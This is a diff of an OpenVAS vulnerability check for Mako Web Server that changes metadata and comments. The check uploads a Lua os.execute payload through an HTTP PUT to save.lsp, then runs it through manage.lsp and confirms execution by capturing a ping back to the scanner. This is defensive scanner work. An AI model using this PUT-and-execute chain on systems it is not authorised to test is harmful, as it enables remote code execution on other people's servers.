@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_mako_web_server_mult_vuln.nasl 8980 2018-02-28 12:03:05Z jschulte $
+# $Id: gb_mako_web_server_mult_vuln.nasl 9298 2018-04-04 10:42:18Z cfischer $
 #
 # Mako Web Server Multiple Vulnerabilities
 #
@@ -29,10 +29,10 @@ CPE = "cpe:/a:mako:mako_web_server";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.811771");
-  script_version("$Revision: 8980 $");
+  script_version("$Revision: 9298 $");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
-  script_tag(name:"last_modification", value:"$Date: 2018-02-28 13:03:05 +0100 (Wed, 28 Feb 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-04-04 12:42:18 +0200 (Wed, 04 Apr 2018) $");
   script_tag(name:"creation_date", value:"2017-09-18 16:33:01 +0530 (Mon, 18 Sep 2017)");
   script_tag(name:"qod_type", value:"exploit");
   script_name("Mako Web Server Multiple Vulnerabilities");
@@ -44,6 +44,7 @@ if(description)
   whether we are able to execute arbitrary code on affected target or not.");
 
   script_tag(name:"insight", value:"Multiple flaws are due to,
+
   - Mako web-server tutorial does not sufficiently sanitize the HTTP PUT
     requests when a user sends an HTTP PUT request to 'save.lsp' web page,
     the input passed to a function responsible for accessing the filesystem.
@@ -67,13 +68,13 @@ if(description)
   may also be affected.");
 
   script_tag(name:"solution", value:"No solution or patch is available as of
-  28th February, 2018. Information regarding this issue will be updated once
+  04th April, 2018. Information regarding this issue will be updated once
   solution details are available. For updates refer to,
   https://makoserver.net");
 
   script_tag(name:"solution_type", value:"NoneAvailable");
 
-  script_xref(name : "URL" , value : "www.exploit-db.com/exploits/42683");
+  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/42683");
   script_xref(name : "URL" , value : "https://blogs.securiteam.com/index.php/archives/3391");
 
   script_category(ACT_ATTACK);
@@ -90,48 +91,35 @@ include("http_func.inc");
 include("http_keepalive.inc");
 include("misc_func.inc");
 
-##Get Port
 if(!makoPort = get_app_port(cpe:CPE)){
   exit(0);
 }
 
-## Open Socket
 soc = open_sock_tcp(makoPort);
 if(!soc){
   exit(0);
 }
 
-##Check platform
 if(host_runs("Windows") == "yes")
 {
-  ## Construct command to be executed on Windows
   CMD = "os.execute('ping -n 5 " + this_host() + "')";
   win = TRUE;
 }
 else
 {
-  ##For Linux and Unix platform
   check = "__OpenVAS__" + rand_str(length:4);
   pattern = hexstr(check);
-  ## Construct command to be executed on Linux/Unix
   CMD = "os.execute('ping -c 5 -p " + pattern + " " + this_host() + "')" ;
 }
 
-##Get Host Name
 host = http_host_name(port:makoPort);
-if(!host){
-  exit(0);
-}
 
-## POSTDATA Length
 len = strlen(CMD);
 if(!len){
   exit(0);
 }
 
-##Construct PUT Request
 url = "/examples/save.lsp?ex=openVASTest";
-
 req = string("PUT ", url, " HTTP/1.1\r\n",
           "Content-Length: ", len, "\r\n",
           "Host: ", host, "\r\n",
@@ -141,17 +129,15 @@ res = http_keepalive_send_recv(port:makoPort, data:req);
 if(res =~ "204 No Content" && "Server: MakoServer.net" >< res)
 {
   url = "/examples/manage.lsp?execute=true&ex=openVASTest&type=lua";
-  ##Construct Attack GET Request
+
   req = string("GET ", url, " HTTP/1.1\r\n",
                "Host: ", host, "\r\n\r\n");
 
-  ##Send GET Req and Get response
   res = send_capture( socket:soc,
                       data:req,
                       timeout:2,
                       pcap_filter: string( "icmp and icmp[0] = 8 and dst host ", this_host(), " and src host ", get_host_ip() ) );
 
-  ##Confirm Response
   if(res && (win || check >< res))
   {
     report = "It was possible to execute command remotely at " + report_vuln_url( port:makoPort, url:url, url_only:TRUE ) + " with the command '" + CMD + "'.";
@@ -160,5 +146,6 @@ if(res =~ "204 No Content" && "Server: MakoServer.net" >< res)
     exit(0);
   }
 }
+
 close(soc);
-exit(0);
+exit(99);
